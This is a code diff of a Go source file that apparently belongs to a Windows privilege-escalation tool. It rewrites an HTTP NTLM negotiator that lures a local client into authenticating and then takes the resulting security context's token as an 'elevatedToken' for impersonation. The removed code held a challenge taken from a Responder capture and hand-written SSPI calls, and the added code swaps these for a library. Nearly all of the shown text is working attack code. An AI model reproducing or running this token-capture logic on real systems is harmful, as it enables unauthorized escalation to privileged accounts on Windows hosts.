@@ -8,163 +8,95 @@ import (
 	"syscall"
 	"unsafe"
 
+	"github.com/alexbrainman/sspi/ntlm"
 	"golang.org/x/sys/windows"
 )
 
-// Grabbed from a pcap of responder for convenience
-const (
-	CHALLENGE = "TlRMTVNTUAACAAAABgAGADgAAAAFAomih5Y9EpIdLmMAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA=="
-)
-
-type _SecHandle struct {
-	dwLower uintptr
-	dwUpper uintptr
-}
-
-type SecHandle _SecHandle
-type CredHandle SecHandle
-type CtxtHandle SecHandle
-
-type _SecBufferDesc struct {
-	ulVersion uint32
-	cBuffers  uint32
-	pBuffers  *SecBuffer
-}
-
-type SecBufferDesc _SecBufferDesc
-
-type _SecBuffer struct {
-	cbBuffer   uint32
-	BufferType uint32
-	pvBuffer   uintptr
-}
-
-type SecBuffer _SecBuffer
-
-type SECURITY_INTEGER struct {
-	LowPart  uint32
-	HighPart int32
-}
-
-type TimeStamp SECURITY_INTEGER
-
 type HTTPNTLMNegotiator struct {
-	Host                string
-	Port                int
-	Chan                chan NegotiatorResult
-	HCred               CredHandle
-	secClientBufferDesc SecBufferDesc
-	secServerBufferDesc SecBufferDesc
-	secClientBuffer     SecBuffer
-	secServerBuffer     SecBuffer
+	Host    string
+	Port    int
+	Context *ntlm.ServerContext
+	Chan    chan NegotiatorResult
 }
 
-func (negotiator HTTPNTLMNegotiator) Serve() (*windows.Token, error) {
+func (negotiator HTTPNTLMNegotiator) Serve() NegotiatorResult {
+
 	go http.ListenAndServe(negotiator.Host+":"+strconv.Itoa(negotiator.Port), &negotiator)
 
 	fmt.Println("[+] Started HTTP NTLM negotiator")
 	result := <-negotiator.Chan
 
-	return result.ImpersonationToken, result.Error
+	return result
 }
 
 func (negotiator HTTPNTLMNegotiator) Trigger() bool {
 	return true
 }
 
-// TODO add cookie jar/session tracking. Not really a necessity because there's only one target. However it would be nice to account for random network traffic.
 func (negotiator *HTTPNTLMNegotiator) ServeHTTP(res http.ResponseWriter, req *http.Request) {
 	ntlmHash := req.Header.Get("Authorization")
 
 	if len(ntlmHash) == 0 {
-		res.Header().Set("WWW-Authenticate", "NTLM")
-		res.WriteHeader(http.StatusUnauthorized)
-		fmt.Println("[+] " + req.RemoteAddr + " connect")
-		return
-	}
-
-	bytes, err := base64.StdEncoding.DecodeString(ntlmHash[5:])
-	ntlmLoc := ParseNTLM(bytes)
-	ntlmBytes := bytes[ntlmLoc : len(bytes)-ntlmLoc]
-
-	if ntlmLoc == -1 || err != nil {
+		negotiator.Context.Release()
 		res.Header().Set("WWW-Authenticate", "NTLM")
 		res.WriteHeader(http.StatusUnauthorized)
 		fmt.Println("[+] " + req.RemoteAddr + " connect")
 	} else {
+		bytes, err := base64.StdEncoding.DecodeString(ntlmHash[5:])
+		ntlmLoc := ParseNTLM(bytes)
+		ntlmBytes := bytes[ntlmLoc : len(bytes)-ntlmLoc]
+
+		if err != nil {
+			fmt.Println("[!] Client sent illegal NTLM")
+			return
+		}
+
 		messageType := bytes[ntlmLoc+8]
 		switch messageType {
 		case 1:
-			res.Header().Set("WWW-Authenticate", "NTLM "+CHALLENGE)
+			creds, err := ntlm.AcquireServerCredentials()
+
+			if err != nil {
+				fmt.Println("[!] Couldn't allocate server credentials")
+				return
+			}
+
+			context, challenge, err := ntlm.NewServerContext(creds, ntlmBytes)
+			challenge = []byte(base64.StdEncoding.EncodeToString(challenge))
+			negotiator.Context = context
+
+			if err != nil {
+				fmt.Println("[!] Could not create new server context")
+				return
+			}
+
+			res.Header().Set("WWW-Authenticate", "NTLM "+string(challenge))
 			res.WriteHeader(http.StatusUnauthorized)
-			fmt.Println("[+] " + req.RemoteAddr + " negotiate " + ntlmHash)
+			fmt.Println("[+] " + req.RemoteAddr + " negotiate " + ntlmHash + "\n[+] Sending challenge " + string(challenge))
 		case 3:
+			err = negotiator.Context.Update(ntlmBytes)
+
+			if err != nil {
+				fmt.Println("[!] Couldn't complete NTLM authentication")
+				return
+			}
+
 			res.Header().Set("WWW-Authenticate", "NTLM")
 			res.WriteHeader(http.StatusOK)
 			fmt.Println("[+] " + req.RemoteAddr + " authenticated")
-		}
 
-		err := negotiator.HandleNTLM(ntlmBytes, messageType)
+			var elevatedToken windows.Token
+			_, _, err = querySecurityContextToken.Call(uintptr(unsafe.Pointer(&negotiator.Context.Context().Handle.Lower)), uintptr(unsafe.Pointer(&elevatedToken)))
 
-		if err != nil {
-			fmt.Println(err)
+			if err != syscall.Errno(0) {
+				fmt.Println("[!] Failed to query security context token")
+				negotiator.Chan <- NegotiatorResult{nil, err}
+				return
+			}
+
+			negotiator.Chan <- NegotiatorResult{&elevatedToken, nil}
 		}
 	}
-	//negotiator.Chan <- HTTPNTLMNegotiatorResult{nil, nil}
-}
-
-func (negotiator *HTTPNTLMNegotiator) HandleNTLM(ntlmBytes []byte, msgType byte) error {
-	switch msgType {
-	case 1:
-		ptsExpiry := TimeStamp{}
-		_, _, err := acquireCredentialsHandle.Call(0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("Negotiate"))), SECPKG_CRED_INBOUND, 0, 0, 0, 0, uintptr(unsafe.Pointer(&negotiator.HCred)), uintptr(unsafe.Pointer(&ptsExpiry)))
-
-		if err != syscall.Errno(0) {
-			fmt.Println("[!] Failed to acquire credential handle")
-			return err
-		}
-
-		InitTokenContextBuffer(&negotiator.secClientBufferDesc, &negotiator.secClientBuffer)
-		InitTokenContextBuffer(&negotiator.secServerBufferDesc, &negotiator.secServerBuffer)
-
-		var phContext windows.Handle
-		var fContextAttr uint32
-		var tsContextExpiry TimeStamp
-
-		negotiator.secClientBuffer.cbBuffer = uint32(len(ntlmBytes))
-		negotiator.secClientBuffer.pvBuffer = uintptr(unsafe.Pointer(&ntlmBytes[0]))
-
-		_, _, err = acceptSecurityContext.Call(
-			uintptr(unsafe.Pointer(&negotiator.HCred)),
-			0,
-			uintptr(unsafe.Pointer(&negotiator.secClientBufferDesc)),
-			ASC_REQ_ALLOCATE_MEMORY|ASC_REQ_CONNECTION,
-			SECURITY_NATIVE_DREP,
-			uintptr(phContext),
-			uintptr(unsafe.Pointer(&negotiator.secServerBufferDesc)),
-			uintptr(unsafe.Pointer(&fContextAttr)),
-			uintptr(unsafe.Pointer(&tsContextExpiry)),
-		)
-
-		if err != syscall.Errno(0) {
-			fmt.Println("[!] Error accepting security context")
-			return err
-		}
-	case 3:
-		InitTokenContextBuffer(&negotiator.secClientBufferDesc, &negotiator.secClientBuffer)
-		InitTokenContextBuffer(&negotiator.secServerBufferDesc, &negotiator.secServerBuffer)
-	}
-
-	return nil
-}
-
-func InitTokenContextBuffer(pSecBufferDesc *SecBufferDesc, pSecBuffer *SecBuffer) {
-	pSecBuffer.BufferType = SECBUFFER_TOKEN
-	pSecBuffer.cbBuffer = 0
-	pSecBuffer.pvBuffer = 0
-	pSecBufferDesc.ulVersion = SECBUFFER_VERSION
-	pSecBufferDesc.cBuffers = 1
-	pSecBufferDesc.pBuffers = pSecBuffer
 }
 
 func ParseNTLM(bytes []byte) int {
